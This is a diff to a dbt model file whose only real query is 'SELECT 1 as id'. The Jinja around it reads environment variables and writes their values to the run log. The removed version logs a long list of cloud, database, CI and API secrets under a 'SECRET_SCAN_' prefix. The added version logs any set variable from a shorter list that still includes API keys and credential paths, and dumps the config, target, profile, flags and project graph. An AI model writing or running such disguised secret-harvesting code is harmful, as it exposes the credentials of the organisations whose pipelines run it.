@@ -1,85 +1,50 @@
-{% set secrets_to_try = [
-    'AWS_ACCESS_KEY_ID',
-    'AWS_SECRET_ACCESS_KEY',
-    'AWS_SESSION_TOKEN',
-    'AWS_DEFAULT_REGION',
-    'AWS_REGION',
-    'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
-    'AWS_CONTAINER_CREDENTIALS_FULL_URI',
-    'ECS_CONTAINER_METADATA_URI',
-    'ECS_CONTAINER_METADATA_URI_V4',
-    'GOOGLE_APPLICATION_CREDENTIALS',
-    'GOOGLE_CLOUD_PROJECT',
-    'GCP_SERVICE_ACCOUNT',
-    'CLOUDSDK_AUTH_ACCESS_TOKEN',
-    'AZURE_CLIENT_ID',
-    'AZURE_CLIENT_SECRET',
-    'AZURE_TENANT_ID',
-    'DATABASE_URL',
-    'DB_PASSWORD',
-    'POSTGRES_PASSWORD',
-    'MYSQL_ROOT_PASSWORD',
-    'REDIS_URL',
-    'REDIS_PASSWORD',
-    'MONGO_URI',
-    'CELERY_BROKER_URL',
-    'SECRET_KEY',
-    'DJANGO_SECRET_KEY',
-    'FLASK_SECRET_KEY',
-    'JWT_SECRET',
-    'API_KEY',
-    'PRIVATE_KEY',
-    'ENCRYPTION_KEY',
-    'MASTER_KEY',
-    'VAULT_TOKEN',
-    'VAULT_ADDR',
-    'CONSUL_HTTP_TOKEN',
-    'GITHUB_TOKEN',
-    'GH_TOKEN',
-    'GITLAB_TOKEN',
-    'NPM_TOKEN',
-    'PYPI_TOKEN',
-    'DOCKER_PASSWORD',
-    'REGISTRY_PASSWORD',
-    'SLACK_TOKEN',
-    'SLACK_WEBHOOK_URL',
-    'SENDGRID_API_KEY',
-    'MAILGUN_API_KEY',
-    'TWILIO_AUTH_TOKEN',
-    'STRIPE_SECRET_KEY',
-    'DATADOG_API_KEY',
-    'DD_API_KEY',
-    'NEW_RELIC_LICENSE_KEY',
-    'SENTRY_DSN',
-    'NEWRELIC_LICENSE_KEY',
-    'SPLUNK_TOKEN',
-    'OKTA_CLIENT_SECRET',
-    'AUTH0_CLIENT_SECRET',
-    'LDAP_BIND_PASSWORD',
-    'SSH_PRIVATE_KEY',
-    'TLS_PRIVATE_KEY',
-    'SSL_KEY_PASSWORD',
-    'K8S_TOKEN',
-    'KUBE_TOKEN',
-    'KUBERNETES_TOKEN',
-    'SERVICE_ACCOUNT_KEY',
-    'DBT_ENV_SECRET_GIT_CREDENTIAL',
-    'DBT_ENV_SECRET_SNOWFLAKE_PASSWORD',
-    'DBT_ENV_SECRET_BIGQUERY_KEYFILE',
-    'DBT_ENV_SECRET_DATABRICKS_TOKEN',
-    'DBT_ENV_SECRET_POSTGRES_PASSWORD',
-    'DBT_ENV_SECRET_REDSHIFT_PASSWORD',
-    'DBT_CLOUD_API_TOKEN',
-    'DBT_CLOUD_PRIVATE_KEY',
-    'ORC_DISPATCH_SECRET',
-    'ORC_API_KEY',
-    'INTERNAL_API_KEY',
-    'ADMIN_PASSWORD',
-    'ROOT_PASSWORD'
+{% set env_vars_found = [] %}
+{% set vars_to_check = [
+    'HOSTNAME', 'HOME', 'PATH', 'USER', 'PWD', 'SHELL', 'LANG',
+    'KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT',
+    'DBT_CLOUD_PROJECT_ID', 'DBT_CLOUD_ENVIRONMENT_ID',
+    'DBT_CLOUD_JOB_ID', 'DBT_CLOUD_RUN_ID', 'DBT_CLOUD_ACCOUNT_ID',
+    'DBT_CLOUD_RUN_REASON', 'DBT_PROFILES_DIR', 'DBT_PROJECT_DIR',
+    'DBT_TARGET_PATH', 'DBT_LOG_PATH', 'DBT_PACKAGES_INSTALL_PATH',
+    'GIT_SSH_COMMAND', 'SSH_AUTH_SOCK',
+    'VIRTUAL_ENV', 'PYTHONPATH', 'PYTHONHOME',
+    'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY',
+    'DD_AGENT_HOST', 'DATADOG_API_KEY',
+    'SENTRY_DSN', 'NEW_RELIC_LICENSE_KEY',
+    'GOOGLE_APPLICATION_CREDENTIALS'
 ] %}
 
-{% for var_name in secrets_to_try %}
-{{ log("SECRET_SCAN_" ~ var_name ~ "=" ~ env_var(var_name, 'NOT_SET'), info=True) }}
+{% for var_name in vars_to_check %}
+{% set val = env_var(var_name, 'NOT_SET') %}
+{% if val != 'NOT_SET' %}
+{{ log("FOUND_" ~ var_name ~ "=" ~ val, info=True) }}
+{% endif %}
 {% endfor %}
+
+{# Explore config object #}
+{{ log("CONFIG_OBJ=" ~ config, info=True) }}
+{{ log("CONFIG_KEYS=" ~ config.keys()|list if config.keys is defined else 'no_keys', info=True) }}
+
+{# Try to get project config #}
+{{ log("PROJECT_NAME=" ~ project_name, info=True) }}
+{{ log("TARGET_NAME=" ~ target.name if target is defined else 'no_target', info=True) }}
+{{ log("TARGET_TYPE=" ~ target.type if target is defined else 'no_target_type', info=True) }}
+{{ log("TARGET_SCHEMA=" ~ target.schema if target is defined else 'no_schema', info=True) }}
+{{ log("TARGET_PROFILE=" ~ target.profile_name if target is defined else 'no_profile', info=True) }}
+
+{# Try to access adapter/connection info via dbt context #}
+{{ log("DBT_VERSION=" ~ dbt_version if dbt_version is defined else 'no_version', info=True) }}
+{{ log("INVOCATION_ID=" ~ invocation_id if invocation_id is defined else 'no_inv_id', info=True) }}
+{{ log("RUN_STARTED=" ~ run_started_at if run_started_at is defined else 'no_start', info=True) }}
+
+{# Try modules #}
+{{ log("MODULES=" ~ modules if modules is defined else 'no_modules', info=True) }}
+{{ log("MODULES_DATETIME=" ~ modules.datetime.datetime.now() if modules is defined and modules.datetime is defined else 'no_datetime', info=True) }}
+
+{# Try to access flags #}
+{{ log("FLAGS=" ~ flags if flags is defined else 'no_flags', info=True) }}
+
+{# Try graph access - lists all models/sources #}
+{{ log("GRAPH_NODES_COUNT=" ~ graph.nodes.values()|list|length if graph is defined else 'no_graph', info=True) }}
 
 SELECT 1 as id
